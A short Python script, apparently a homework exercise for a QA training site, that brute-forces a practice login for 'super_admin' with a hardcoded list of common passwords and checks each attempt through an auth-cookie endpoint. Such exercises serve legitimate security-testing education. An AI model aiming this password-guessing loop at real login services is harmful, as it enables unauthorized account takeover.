import json
import requests

passwords = ['password', 123456, 12345678, 'qwerty', 'abc123', 'monkey', 1234567, 'letmein', 'trustno1', 'dragon', 'baseball', 111111, 'iloveyou', 'master', 'sunshine', 'ashley', 'bailey', 'passw0rd', 'shadow', 123123, 654321, 'superman', 'qazwsx', 'michael', 'Football', 'password1', 'mustang', 'ninja', 'jesus', 'football', 'welcome', 123456789, 'adobe123', 'admin', 1234567890, 'photoshop', 1234, 12345, 'princess', 'azerty', 000000, 'batman', 696969, 'superman', 'access', '1qaz2wsx', 'login', 'qwertyuiop', 'solo', 'starwars', 'zaq1zaq1', 'loveme', 'hottie', 'flower', 121212, 'hello', 'freedom', 'whatever', 'donald', 'aa123456', 'charlie', '!@#$%^&*', 666666, '1q2w3e4r', 555555, 'lovely', 7777777, 888888, '123qwe']
for i in passwords:
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data={"login": "super_admin", "password": i})
    check_cookie = requests.get('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies=dict(response.cookies))
    result = check_cookie.text
    if result == 'You are authorized':
        print(f'Password "{i}" is true! {result}')
        break

